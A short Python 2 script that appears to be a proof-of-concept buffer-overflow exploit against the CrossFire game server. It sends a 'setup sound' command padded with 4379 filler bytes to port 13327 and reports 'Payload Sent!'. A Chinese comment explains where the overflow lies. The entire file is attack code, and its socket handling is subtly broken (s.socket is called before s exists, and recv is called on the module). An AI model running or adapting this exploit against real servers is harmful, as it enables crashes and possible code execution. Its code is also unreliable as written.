#!/usr/bin/python
#coding=utf-8
import socket

def main():
	host = '127.0.0.1'
	crash = "\x41" * 4379
	# 该缓冲区溢出存在于setup sound指令中，\x11为DC1设备控制1，后面nop加null表示指令完成
	buffer = "\x11(setup sound " + crash + "\x90\x00#"
	try:
		s = s.socket(socket.AF_INET, socket.SOCK_STREAM)
		print "[*]Sending evil buffer"
		s.connect((host, 13327))
		data = socket.recv(1024)
		print data
		s.send(buffer)
		s.close()
		print "[*]Payload Sent!"
	except Exception as e:
		print "[-]Can't connect CrossFire!"
		print e

if __name__ == '__main__':
	main()